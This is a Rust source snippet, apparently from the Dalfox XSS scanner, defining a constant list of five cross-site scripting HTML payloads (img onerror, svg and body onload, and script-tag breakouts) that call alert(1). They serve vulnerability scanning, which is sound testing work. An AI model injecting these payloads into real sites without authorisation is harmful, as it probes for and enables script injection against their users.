pub const XSS_HTML_PAYLOADS: &[&str] = &[
    "<img src=x onerror=alert(1) class=dalfox>",
    "<svg onload=alert(1) class=dalfox>",
    "<body onload=alert(1) class=dalfox>",
    "'><script class=dalfox>alert(1)</script>",
    "\"><script class=dalfox>alert(1)</script>",
];
